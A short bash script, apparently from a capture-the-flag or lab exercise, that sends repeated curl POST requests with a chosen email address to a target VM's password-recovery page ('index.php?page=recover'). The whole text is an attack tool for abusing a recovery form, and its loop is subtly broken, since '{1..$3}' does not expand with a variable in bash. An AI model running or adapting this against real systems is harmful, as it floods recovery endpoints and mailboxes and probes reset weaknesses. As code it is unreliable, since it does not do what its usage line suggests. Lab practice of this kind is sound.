if [[ $# -ne 3 ]]; then
	echo "specify the ip of the VM"
	echo "./`basename $0` <ip> <mail> <count>"
else
	for i in {1..$3}; do curl -X POST -d "mail=$2" -d "Submit=Submit" "$1/index.php?page=recover"; done
fi